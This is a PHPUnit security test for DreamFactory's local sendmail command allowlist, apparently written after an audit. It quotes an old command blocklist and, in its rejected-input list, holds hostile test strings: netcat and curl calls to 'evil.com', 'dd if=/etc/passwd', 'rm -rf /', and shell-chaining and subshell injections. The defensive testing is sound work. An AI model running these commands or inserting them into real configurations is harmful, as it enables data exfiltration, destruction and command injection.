<?php

namespace DreamFactory\Core\Email\Tests\Security;

use PHPUnit\Framework\TestCase;

/**
 * Security: Local mailer's `command` setting must be an allowlisted sendmail
 * invocation, not a substring-blocklist.
 *
 * The April 2026 audit (df-email P1) found a 12-item substring blocklist:
 *
 *     $disallowedCommands = ['rm','sudo','sh','bash','fsockopen','exec',
 *                            'system','popen','proc_open','passthru','curl','wget'];
 *     foreach (...) { if (strpos($command, $d) !== false) throw }
 *
 * Bypasses: case (`RM`), absolute paths (`/usr/bin/curl`), alternatives
 * (`nc`, `dd`, `fetch`), command chaining (`sendmail; nc evil.com`).
 *
 * The fix replaces the blocklist with an allowlist — only literal `sendmail`
 * or an absolute path ending in `/sendmail`, followed only by short flag
 * tokens. Shell metacharacters are rejected unconditionally.
 */
class LocalSendmailCommandTest extends TestCase
{
    /**
     * @dataProvider acceptedCommandProvider
     */
    public function testAcceptsLegitimateSendmailInvocations(string $command): void
    {
        \DreamFactory\Core\Email\Services\Local::assertCommandAllowlisted($command);
        $this->assertTrue(true, 'Accepted: ' . $command);
    }

    public static function acceptedCommandProvider(): array
    {
        return [
            'bare sendmail'             => ['sendmail'],
            'sendmail with -bs'         => ['sendmail -bs'],
            'sendmail with -t -i'       => ['sendmail -t -i'],
            'absolute usr sbin'         => ['/usr/sbin/sendmail -bs'],
            'absolute usr bin'          => ['/usr/bin/sendmail -t -i'],
        ];
    }

    /**
     * @dataProvider rejectedCommandProvider
     */
    public function testRejectsDangerousCommands(string $command): void
    {
        $this->expectException(\InvalidArgumentException::class);
        \DreamFactory\Core\Email\Services\Local::assertCommandAllowlisted($command);
    }

    public static function rejectedCommandProvider(): array
    {
        return [
            // Old-blocklist bypasses
            'curl absolute path'        => ['/usr/bin/curl http://evil.com'],
            'wget absolute path'        => ['/usr/bin/wget http://evil.com'],
            'uppercase RM bypass'       => ['/bin/RM -rf /'],
            'nc not in old blocklist'   => ['nc evil.com 4444'],
            'dd not in old blocklist'   => ['dd if=/etc/passwd'],
            // Shell-injection metacharacters
            'semicolon chain'           => ['sendmail; rm -rf /'],
            'pipe chain'                => ['sendmail | nc evil 1234'],
            'backtick subshell'         => ['sendmail `id`'],
            'dollar paren subshell'     => ['sendmail $(id)'],
            'ampersand background'      => ['sendmail & curl evil'],
            'redirect'                  => ['sendmail > /tmp/x'],
            // Non-sendmail executables
            'arbitrary perl'            => ['perl -e "system(\'id\')"'],
            'arbitrary bash'            => ['bash -c "id"'],
            'empty string'              => [''],
        ];
    }
}
